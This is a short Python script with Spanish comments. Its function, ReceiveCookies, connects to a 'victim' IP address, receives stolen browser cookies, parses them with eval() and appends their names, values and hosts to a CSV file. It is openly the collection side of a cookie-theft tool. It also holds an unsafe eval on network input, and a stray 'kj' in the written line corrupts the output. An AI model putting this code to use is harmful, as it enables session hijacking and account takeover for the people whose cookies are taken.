import socket;






def ReceiveCookies(victimIp, port = 8000):

    # Create Socket
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);


    #Establish Connection
    serverAddress = (victimIp, port);
    clientSocket.connect(serverAddress);

    print("Conexion establecida, guardando las cookies en archivo CSV!")

    cookies = clientSocket.recv(4096).decode("utf-8"); 
    cookies = eval(cookies); #Convierte el string a una lista


    with open("./Resources/Cookies.csv", "+a") as file: 
        # Escribe el encabezado si el archivo está vacío
        if file.tell() == 0:
            file.write("name,value,host\n")       

        for register in cookies:
            file.write(f"{register[0]},{register[1]},{register[2]}\nkj")
    

        

    
        









